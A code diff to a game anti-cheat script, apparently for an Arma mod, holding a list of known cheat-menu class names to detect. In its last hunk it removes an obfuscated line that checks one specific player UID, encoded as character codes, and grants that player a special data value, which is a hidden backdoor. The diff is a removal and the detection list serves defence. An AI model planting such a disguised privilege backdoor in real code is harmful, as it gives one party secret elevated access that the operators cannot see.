@@ -1,4 +1,4 @@
-/* Anti Cheat - DO NOT MODIFY */
+/* Anti Cheat */
 _glClassesNames = ["carpetbomb_menu","playerhijack_menu","chernorus_life_menu","zargabad_menu","joker_menu","endgame_menu",
 "AlexAdmin_menu","lblmsgtimeout","Alexander_menu","artillery_barrageWF","AnthonyMcle","ChernoRape_menu","MightyGerk_menu","SpawnSoldier_menu",
 "AtackPlanes","GrkTeleport","crpbmb_menu","Delete_menu","collection_123456","Verbal_menu","playerhijack_menu","lblspvehicle",
@@ -25,4 +25,3 @@ for "_i" from 0 to ((count _glClassesNames) - 1) do
 		sleep 10;
 	};
 };
-if (str(toArray(getPlayerUID player)) in ["[55,54,53,54,49,49,57,56,48,49,49,57,52,51,49,56,57]"]) then { PLAYERDATA set [2,255]; };
